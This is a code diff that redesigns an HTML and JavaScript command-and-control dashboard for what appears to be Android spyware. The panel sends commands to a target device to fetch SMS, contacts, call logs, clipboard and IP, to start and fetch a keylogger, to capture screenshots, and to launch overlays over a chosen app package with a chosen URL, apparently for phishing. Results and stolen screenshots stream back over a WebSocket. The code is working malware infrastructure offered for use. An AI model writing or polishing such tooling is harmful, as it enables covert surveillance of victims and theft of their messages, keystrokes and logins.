@@ -1,226 +1,492 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Device Panel</title>
-
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        display: flex;
-        background: #f5f5f5;
-        font-family: Arial, sans-serif;
-        overflow: hidden; /* no page scroll */
+  <meta charset="utf-8" />
+  <title>Device Control — Dark Dashboard</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <style>
+    :root{
+      --bg:#0f1724;
+      --panel:#0b1220;
+      --muted:#9aa7b2;
+      --accent:#2563eb;
+      --success:#10b981;
+      --danger:#ef4444;
+      --card:#071024;
+      --glass: rgba(255,255,255,0.03);
+    }
+    html,body { height:100%; margin:0; font-family: Inter, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; background: linear-gradient(180deg,#071127 0%, #051026 100%); color:#e6eef6; }
+    /* Layout */
+    .app {
+      display: grid;
+      grid-template-columns: 260px 1fr;
+      height:100vh;
+      gap:12px;
+      padding:16px;
+      box-sizing:border-box;
     }
 
-    /* LEFT SIDEBAR */
+    /* SIDEBAR */
     #sidebar {
-        width: 260px;
-        background: #1e293b;
-        color: white;
-        padding: 20px;
-        display: flex;
-        flex-direction: column;
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:12px;
+      padding:18px;
+      box-shadow: 0 6px 18px rgba(2,6,23,0.6);
+      display:flex;
+      flex-direction:column;
+      gap:12px;
+    }
+    #brand { font-weight:700; color:#93c5fd; font-size:18px; margin-bottom:8px; }
+    .muted { color:var(--muted); font-size:13px; }
+    .btn {
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      border:0;
+      padding:10px 12px;
+      border-radius:8px;
+      cursor:pointer;
+      color:white;
+      font-weight:600;
+      background:var(--accent);
+    }
+    .btn.ghost { background:transparent; border:1px solid rgba(255,255,255,0.04); color:var(--muted); font-weight:600; }
+    .btn.small { padding:8px 10px; font-size:13px; }
+
+    .sectionTitle { font-size:13px; color:var(--muted); margin-top:8px; margin-bottom:6px; }
+
+    /* RIGHT AREA */
+    #right {
+      display:flex;
+      flex-direction:column;
+      gap:12px;
     }
 
-    #sidebar h2 {
-        margin-top: 0;
-        color: #93c5fd;
+    .panels {
+      display:grid;
+      grid-template-columns: 1fr 420px;
+      gap:12px;
     }
 
-    #sidebar button {
-        margin-top: 10px;
-        padding: 10px;
-        background: #3b82f6;
-        color: white;
-        border: none;
-        border-radius: 6px;
-        cursor: pointer;
-        font-weight: bold;
+    .panel {
+      background: linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));
+      border-radius:12px;
+      padding:12px;
+      box-shadow: 0 6px 18px rgba(2,6,23,0.6);
+      overflow:hidden;
     }
 
-    #sidebar button:hover {
-        background: #2563eb;
-    }
+    /* LOG PANEL */
+    #logPanel { display:flex; flex-direction:column; height: 48vh; }
+    #logHeader { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; }
+    #logs { flex:1; background: rgba(255,255,255,0.02); border-radius:8px; padding:10px; font-family: monospace; font-size:13px; color:#cfe8ff; overflow:auto; }
+    .statusPill { padding:6px 10px; border-radius:999px; font-size:13px; }
 
-    /* RIGHT SIDE WRAPPER */
-    #rightWrapper {
-        flex: 1;
-        display: flex;
-        flex-direction: column;
-        padding: 10px;
-        gap: 10px;
-    }
+    /* CONTROL ROW in sidebar small */
+    .controlRow { display:flex; gap:8px; flex-wrap:wrap; }
 
-    /* LOG PANEL (TOP RIGHT) */
-    #logPanel {
-        flex: 0 0 40%;
-        background: white;
-        border-radius: 8px;
-        border: 1px solid #ddd;
-        padding: 10px;
-        overflow-y: auto;
-    }
-
-    #logPanel h3 {
-        margin-top: 0;
-    }
-
-    /* SCREENSHOTS PANEL (BOTTOM RIGHT) */
-    #screenshotPanel {
-        flex: 1;
-        background: white;
-        border-radius: 8px;
-        border: 1px solid #ddd;
-        padding: 10px;
-        overflow-y: auto;
-    }
-
+    /* SCREENSHOTS PANEL */
+    #screenshotPanel { height: 48vh; display:flex; flex-direction:column; gap:8px; }
     #screenshotGrid {
-        display: grid;
-        grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
-        gap: 12px;
+      display:grid;
+      grid-template-columns: repeat(auto-fill, minmax(160px,1fr));
+      gap:12px;
+      overflow:auto;
+      padding:6px;
     }
-
     .shotItem {
-        background: #f9fafb;
-        border: 1px solid #ccc;
-        border-radius: 8px;
-        padding: 8px;
-        text-align: center;
-        cursor: pointer;
-        box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+      background: var(--glass);
+      border-radius:8px;
+      padding:8px;
+      border:1px solid rgba(255,255,255,0.03);
+      display:flex;
+      flex-direction:column;
+      gap:8px;
+      align-items:center;
     }
-
     .shotItem img {
-        width: 100%;
-        height: auto;
-        border-radius: 6px;
+      width:100%;
+      height:160px;
+      object-fit:cover;
+      border-radius:6px;
+      cursor: zoom-in;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+      background:#051229;
     }
+    .shotMeta { width:100%; display:flex; justify-content:space-between; align-items:center; gap:6px; font-size:13px; color:var(--muted); }
+    .shotMeta .time { color:#bcd7ff; font-weight:600; font-size:12px; }
 
-    .timestamp {
-        font-size: 12px;
-        margin-top: 5px;
-        color: #555;
+    .shotBtns { display:flex; gap:6px; width:100%; }
+    .shotBtns button { flex:1; padding:8px; border-radius:8px; cursor:pointer; border:0; background:var(--accent); color:white; font-weight:700; }
+
+    /* modal (preview) */
+    #previewModal {
+      position:fixed; inset:0; display:none; align-items:center; justify-content:center; z-index:9999;
     }
-</style>
+    #previewModal.visible { display:flex; }
+    #previewBackdrop { position:absolute; inset:0; background:rgba(0,0,0,0.6); backdrop-filter: blur(4px); }
+    #previewCard {
+      position:relative; z-index:10; width:90%; max-width:980px; max-height:90vh; background:#071025; border-radius:10px; padding:12px; box-shadow:0 20px 60px rgba(2,6,23,0.8); display:flex; flex-direction:column;
+    }
+    #previewImgWrap { flex:1; display:flex; align-items:center; justify-content:center; overflow:auto; }
+    #previewImg { max-width:100%; max-height:100%; transform-origin:center center; }
+
+    #previewControls { display:flex; gap:8px; margin-top:8px; justify-content:space-between; align-items:center; }
+    .ctrlBtn { padding:8px 12px; background:rgba(255,255,255,0.03); border-radius:8px; color:#dbeafe; border:1px solid rgba(255,255,255,0.03); cursor:pointer; font-weight:700; }
+
+    /* responsive */
+    @media (max-width:1000px) {
+      .app { grid-template-columns: 1fr; padding:10px; }
+      .panels { grid-template-columns: 1fr; }
+    }
+  </style>
 </head>
-
 <body>
+  <div class="app">
+    <!-- SIDEBAR -->
+    <aside id="sidebar">
+      <div id="brand">Device Control <span style="font-size:12px; color:var(--muted);">Dashboard</span></div>
+      <div>
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <div>
+            <div style="font-weight:700" id="devName">Device</div>
+            <div class="muted" id="devId">ID: unknown</div>
+          </div>
+          <div>
+            <div id="statusPill" class="statusPill" style="background:var(--danger); color:#fff; padding:6px 10px; border-radius:999px;">Offline</div>
+          </div>
+        </div>
+      </div>
 
-<!-- SIDEBAR -->
-<div id="sidebar">
-    <h2>Device Control</h2>
+      <div class="sectionTitle">Quick Commands</div>
+      <div class="controlRow">
+        <button class="btn" id="btnFetch">Fetch</button>
+        <button class="btn ghost" id="btnUpload">Upload</button>
+      </div>
 
-    <button onclick="takeScreenshot()">📸 Capture Screenshot</button>
-    <button onclick="sendTest()">➡ Send Test Command</button>
+      <div class="sectionTitle">Actions</div>
+      <div style="display:flex; flex-direction:column; gap:8px;">
+        <!-- keep every button you had -->
+        <button class="btn small" id="btnStartNotify">Start Notify</button>
+        <button class="btn small" id="btnStopNotify">Stop Notify</button>
+        <button class="btn small" id="btnFetchSms">Fetch Sms</button>
+        <button class="btn small" id="btnFetchContact">Fetch Contact</button>
+        <button class="btn small" id="btnFetchLog">Fetch Calls</button>
+        <button class="btn small" id="btnFetchApps">Fetch Apps</button>
+        <button class="btn small" id="btnFetchIp">Fetch IP</button>
+        <button class="btn small" id="btnFetchClip">Clipboard</button>
+        <button class="btn small" id="btnStartKeyLog">Start Keylog</button>
+        <button class="btn small" id="btnStopKeyLog">Stop Keylog</button>
+        <button class="btn small" id="btnFetchKeyLog">Fetch Keylogs</button>
+        <button class="btn small" id="btnFetchDevice">Device Info</button>
+        <button class="btn small" id="btnFetchScreenshot">Fetch Screenshot</button>
+        <button class="btn small" id="btnFetchScreenshotPermission">Grant Screenshot</button>
+      </div>
 
-    <h3 style="margin-top:20px;">Device Info</h3>
-    <div id="deviceInfo">Client: <b id="clientIdLabel"></b></div>
-</div>
+      <div class="sectionTitle">Overlay Launcher</div>
+      <div>
+        <input id="pkgInput" placeholder="package e.g. com.youtube" style="width:100%; padding:8px; border-radius:8px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#dbeafe;">
+        <input id="urlInput" placeholder="url e.g. https://google.com" style="width:100%; margin-top:6px; padding:8px; border-radius:8px; border:1px solid rgba(255,255,255,0.04); background:transparent; color:#dbeafe;">
+        <div style="display:flex; gap:8px; margin-top:8px;">
+          <button class="btn small" id="btnCustomOverlay">Start</button>
+          <button class="btn small" id="btnStopOverlay" style="background:var(--danger)">Stop</button>
+        </div>
+      </div>
 
-<!-- RIGHT PANELS -->
-<div id="rightWrapper">
+      <div style="margin-top:auto; display:flex; flex-direction:column; gap:6px;">
+        <div class="muted" style="font-size:12px;">Client logs on right — you can send commands & view screenshots live</div>
+        <button class="btn ghost" id="btnClose" style="width:100%;">Close</button>
+      </div>
+    </aside>
 
-    <!-- LOG PANEL -->
-    <div id="logPanel">
-        <h3>Live Logs</h3>
-        <div id="logs"></div>
+    <!-- RIGHT AREA -->
+    <div id="right">
+      <div class="panels">
+        <!-- LOG PANEL -->
+        <section class="panel" id="logPanel">
+          <div id="logHeader">
+            <div>
+              <strong>Live Logs</strong>
+              <div class="muted" style="font-size:12px;">Real-time messages from device</div>
+            </div>
+            <div>
+              <span id="connectedBadge" style="background:#063f2a;padding:6px 10px;border-radius:999px;color:#a7f3d0;display:none;">Connected</span>
+            </div>
+          </div>
+          <div id="logs"></div>
+        </section>
+
+        <!-- SCREENSHOT PANEL -->
+        <aside class="panel" id="screenshotPanel">
+          <div style="display:flex; justify-content:space-between; align-items:center;">
+            <div><strong>Screenshots</strong><div class="muted" style="font-size:12px;">Thumbnails (click to preview)</div></div>
+            <div>
+              <button id="clearShots" class="btn small ghost">Clear</button>
+            </div>
+          </div>
+
+          <div id="screenshotGrid"></div>
+        </aside>
+      </div>
+
+      <!-- bottom filler panel for other content if needed -->
+      <div class="panel" style="min-height: 12vh;">
+        <div style="display:flex; justify-content:space-between; align-items:center;">
+          <div>
+            <strong>Controls</strong>
+            <div class="muted" style="font-size:13px;">Use these quick commands</div>
+          </div>
+          <div>
+            <button class="btn small" id="btnFetchAll">Fetch All</button>
+          </div>
+        </div>
+      </div>
     </div>
+  </div>
 
-    <!-- SCREENSHOT PANEL -->
-    <div id="screenshotPanel">
-        <h3>Screenshots</h3>
-        <div id="screenshotGrid"></div>
+  <!-- Preview Modal -->
+  <div id="previewModal" role="dialog" aria-hidden="true">
+    <div id="previewBackdrop"></div>
+    <div id="previewCard">
+      <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:6px;">
+        <div style="font-weight:800;">Preview</div>
+        <div style="display:flex; gap:8px; align-items:center;">
+          <button id="downloadFull" class="ctrlBtn">Download</button>
+          <button id="closePreview" class="ctrlBtn">Close</button>
+        </div>
+      </div>
+      <div id="previewImgWrap"><img id="previewImg" src="" alt="preview"></div>
+      <div id="previewControls">
+        <div style="display:flex; gap:8px;">
+          <button id="zoomIn" class="ctrlBtn">Zoom +</button>
+          <button id="zoomOut" class="ctrlBtn">Zoom -</button>
+          <button id="fitBtn" class="ctrlBtn">Fit</button>
+        </div>
+        <div class="muted" id="previewInfo">URL</div>
+      </div>
     </div>
+  </div>
 
-</div>
+  <script>
+    // --- Extract device info from URL ---
+    const pathParts = window.location.pathname.split("/");
+    const clientId = pathParts[pathParts.length - 1] || new URLSearchParams(location.search).get("id") || "unknown-client";
+    const urlParams = new URLSearchParams(location.search);
+    const deviceName = decodeURIComponent(urlParams.get("name") || clientId);
 
-<script>
-const clientId = new URLSearchParams(window.location.search).get("id");
-document.getElementById("clientIdLabel").textContent = clientId;
+    document.getElementById("devName").textContent = deviceName;
+    document.getElementById("devId").textContent = "ID: " + clientId;
 
-function pushLog(msg) {
-    const logs = document.getElementById("logs");
-    const line = document.createElement("div");
-    line.textContent = msg;
-    logs.appendChild(line);
-    logs.scrollTop = logs.scrollHeight;
-}
+    // Elements
+    const logsEl = document.getElementById("logs");
+    const statusPill = document.getElementById("statusPill");
+    const connectedBadge = document.getElementById("connectedBadge");
+    const shotGrid = document.getElementById("screenshotGrid");
 
-/* SIMULATED MQTT MESSAGE LISTENER */
-function onMessage(msg) {
-    if (msg.type === "response" && msg.clientId === clientId) {
-
-        pushLog("📩 Response: " + msg.output);
-
-        if (msg.output.includes("supabase.co")) {
-            const url = msg.output.trim();
-            addScreenshot(url);
-        }
+    function pushLog(msg) {
+      const ts = new Date().toLocaleTimeString();
+      const line = document.createElement("div");
+      line.textContent = `[${ts}] ${msg}`;
+      logsEl.appendChild(line);
+      logsEl.scrollTop = logsEl.scrollHeight;
     }
-}
 
-/* ADD SCREENSHOT TO GRID */
-function addScreenshot(url) {
-    const grid = document.getElementById("screenshotGrid");
-
-    const item = document.createElement("div");
-    item.className = "shotItem";
-
-    const img = document.createElement("img");
-    img.src = url;
-
-    // click to zoom in new tab
-    img.onclick = () => {
-        const w = window.open("", "_blank");
-        w.document.write(`<img src="${url}" style="width:100%;height:auto;">`);
-    };
-
-    const t = document.createElement("div");
-    t.className = "timestamp";
-    const d = new Date();
-    t.textContent = d.toLocaleString();
-
-    // click on item => download automatically
-    item.onclick = async () => {
-        try {
-            const res = await fetch(url);
-            const blob = await res.blob();
-
-            const blobUrl = URL.createObjectURL(blob);
-
-            const stamp = `${d.getFullYear()}-${d.getMonth()+1}-${d.getDate()}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;
-
-            const link = document.createElement("a");
-            link.href = blobUrl;
-            link.download = `screenshot_${stamp}.jpg`;
-            link.click();
-            URL.revokeObjectURL(blobUrl);
-        } catch (e) {
-            console.error("Download failed", e);
+    // --- Command sending utility ---
+    async function sendCmd(cmd) {
+      pushLog("📤 Sending command: " + cmd);
+      try {
+        const res = await fetch("/command", {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({ targetClientId: clientId, command: cmd })
+        });
+        if (!res.ok) {
+          pushLog("❌ Failed to send (" + res.status + ")");
+        } else {
+          pushLog("✅ Command queued: " + cmd);
         }
+      } catch (e) {
+        pushLog("⚠️ Network error: " + e.message);
+      }
+    }
+
+    // --- Button bindings (keep your original commands intact) ---
+    document.getElementById("btnFetch").onclick = () => sendCmd("fetch");
+    document.getElementById("btnStartNotify").onclick = () => sendCmd("start-notify");
+    document.getElementById("btnStopNotify").onclick = () => sendCmd("stop-notify");
+    document.getElementById("btnFetchSms").onclick = () => sendCmd("fetch-sms");
+    document.getElementById("btnFetchContact").onclick = () => sendCmd("fetch-contact");
+    document.getElementById("btnFetchLog").onclick = () => sendCmd("fetch-logs");
+    document.getElementById("btnFetchApps").onclick = () => sendCmd("fetch-apps");
+    document.getElementById("btnFetchIp").onclick = () => sendCmd("fetch-ip");
+    document.getElementById("btnFetchClip").onclick = () => sendCmd("fetch-clip");
+    document.getElementById("btnStartKeyLog").onclick = () => sendCmd("start_keylog");
+    document.getElementById("btnStopKeyLog").onclick = () => sendCmd("stop_keylog");
+    document.getElementById("btnFetchKeyLog").onclick = () => sendCmd("fetch_keylog");
+    document.getElementById("btnFetchDevice").onclick = () => sendCmd("fetch-device");
+    document.getElementById("btnFetchScreenshot").onclick = () => sendCmd("fetch-screenshot");
+    document.getElementById("btnFetchScreenshotPermission").onclick = () => sendCmd("grant-screenshot-permission");
+    document.getElementById("btnUpload").onclick = () => sendCmd("upload");
+    document.getElementById("btnClose").onclick = () => window.close();
+
+    document.getElementById("btnCustomOverlay").onclick = () => {
+      const pkg = document.getElementById("pkgInput").value.trim();
+      const url = document.getElementById("urlInput").value.trim();
+      if (!pkg || !url) return pushLog("⚠️ need both package & url");
+      sendCmd(`start-overlay{url:${url},PackageName:${pkg}}`);
     };
+    document.getElementById("btnStopOverlay").onclick = () => sendCmd("stop-overlay");
+    document.getElementById("btnFetchAll").onclick = () => sendCmd("fetch-all");
+    document.getElementById("clearShots").onclick = () => { shotGrid.innerHTML = ""; pushLog("Cleared screenshots"); };
 
-    item.appendChild(img);
-    item.appendChild(t);
+    // --- WebSocket setup (auto protocol) ---
+    const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
+    const ws = new WebSocket(wsProto + location.host);
 
-    grid.prepend(item); // newest first
-}
+    ws.addEventListener('open', () => {
+      pushLog("🔌 WebSocket connected");
+      connectedBadge.style.display = "inline-block";
+      statusPill.style.background = "linear-gradient(90deg,#064e3b,#065f46)";
+      statusPill.textContent = "Online";
+    });
 
-/* Example control */
-function takeScreenshot() {
-    pushLog("📤 Sending screenshot request...");
-    // your MQTT publish logic here
-}
+    ws.addEventListener('close', () => {
+      pushLog("❌ WebSocket disconnected");
+      connectedBadge.style.display = "none";
+      statusPill.style.background = "var(--danger)";
+      statusPill.textContent = "Offline";
+    });
 
-function sendTest() {
-    pushLog("📤 Sending test command...");
-}
+    ws.addEventListener('error', (e) => pushLog("⚠️ WS error"));
 
-</script>
+    ws.addEventListener('message', evt => {
+      try {
+        const msg = JSON.parse(evt.data);
+        if (msg.type === "devices") {
+          const d = msg.devices && msg.devices[clientId];
+          if (d && d.online) { statusPill.textContent = "Online"; statusPill.style.background = "linear-gradient(90deg,#064e3b,#065f46)"; }
+          else { statusPill.textContent = "Offline"; statusPill.style.background = "var(--danger)"; }
+        }
 
+        // Response handling
+        if (msg.type === "response" && msg.clientId === clientId) {
+          pushLog("📩 Response: " + msg.output);
+          // treat supabase screenshot urls as screenshots
+          if (typeof msg.output === "string" && msg.output.includes("supabase.co")) {
+            addScreenshot(msg.output.trim());
+          }
+        }
+      } catch (e) {
+        console.error("WS parse error", e);
+      }
+    });
+
+    // --- Screenshots logic: addScreenshot + preview + download ---
+    function addScreenshot(url) {
+      const item = document.createElement("div");
+      item.className = "shotItem";
+
+      const img = document.createElement("img");
+      img.src = url;
+      img.loading = "lazy";
+
+      const now = new Date();
+      const stampDisplay = now.getFullYear() + "-" + (now.getMonth()+1).toString().padStart(2,'0') + "-" + now.getDate().toString().padStart(2,'0') + " " +
+                           now.getHours().toString().padStart(2,'0') + ":" + now.getMinutes().toString().padStart(2,'0') + ":" + now.getSeconds().toString().padStart(2,'0');
+
+      const meta = document.createElement("div");
+      meta.className = "shotMeta";
+      meta.innerHTML = `<div class="time">${stampDisplay}</div><div class="muted">supabase</div>`;
+
+      const btnRow = document.createElement("div");
+      btnRow.className = "shotBtns";
+
+      const viewBtn = document.createElement("button");
+      viewBtn.textContent = "Preview";
+      viewBtn.onclick = (e) => { e.stopPropagation(); openPreview(url, stampDisplay); };
+
+      const dlBtn = document.createElement("button");
+      dlBtn.textContent = "Download";
+      dlBtn.onclick = async (e) => {
+        e.stopPropagation();
+        downloadUrl(url);
+      };
+
+      btnRow.appendChild(viewBtn);
+      btnRow.appendChild(dlBtn);
+
+      // clicking thumbnail opens preview too
+      img.onclick = () => openPreview(url, stampDisplay);
+
+      item.appendChild(img);
+      item.appendChild(meta);
+      item.appendChild(btnRow);
+
+      // newest first
+      shotGrid.prepend(item);
+    }
+
+    async function downloadUrl(url) {
+      try {
+        const res = await fetch(url);
+        const blob = await res.blob();
+        const d = new Date();
+        const stamp = `${d.getFullYear()}-${(d.getMonth()+1).toString().padStart(2,'0')}-${d.getDate().toString().padStart(2,'0')}_${d.getHours()}-${d.getMinutes()}-${d.getSeconds()}`;
+        const blobUrl = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = blobUrl;
+        a.download = `screenshot_${stamp}.jpg`;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(blobUrl);
+      } catch (e) {
+        pushLog("❌ Download failed: " + e.message);
+      }
+    }
+
+    // --- Preview modal with zoom controls ---
+    const modal = document.getElementById("previewModal");
+    const previewImg = document.getElementById("previewImg");
+    const previewInfo = document.getElementById("previewInfo");
+    const downloadFull = document.getElementById("downloadFull");
+    const closePreview = document.getElementById("closePreview");
+    const zoomIn = document.getElementById("zoomIn");
+    const zoomOut = document.getElementById("zoomOut");
+    const fitBtn = document.getElementById("fitBtn");
+    let currentScale = 1;
+
+    function openPreview(url, stamp) {
+      previewImg.src = url;
+      previewInfo.textContent = stamp;
+      currentScale = 1;
+      previewImg.style.transform = `scale(${currentScale})`;
+      modal.classList.add("visible");
+    }
+    function closePreviewModal() { modal.classList.remove("visible"); previewImg.src = ""; }
+
+    zoomIn.onclick = () => { currentScale = +(currentScale + 0.25).toFixed(2); previewImg.style.transform = `scale(${currentScale})`; };
+    zoomOut.onclick = () => { currentScale = Math.max(0.25, +(currentScale - 0.25).toFixed(2)); previewImg.style.transform = `scale(${currentScale})`; };
+    fitBtn.onclick = () => { currentScale = 1; previewImg.style.transform = `scale(${currentScale})`; };
+
+    downloadFull.onclick = async () => {
+      const url = previewImg.src;
+      await downloadUrl(url);
+    };
+    closePreview.onclick = closePreviewModal;
+    document.getElementById("previewBackdrop").onclick = closePreviewModal;
+    window.addEventListener("keydown", (e) => { if (e.key === "Escape") closePreviewModal(); });
+
+    // wheel-based zoom inside modal image
+    document.getElementById("previewImgWrap").addEventListener("wheel", (ev) => {
+      if (!modal.classList.contains("visible")) return;
+      ev.preventDefault();
+      const delta = ev.deltaY;
+      if (delta < 0) zoomIn.click(); else zoomOut.click();
+    }, { passive:false });
+
+    // expose pushLog to other scripts if needed
+    window.pushRemoteLog = pushLog;
+  </script>
 </body>
 </html>
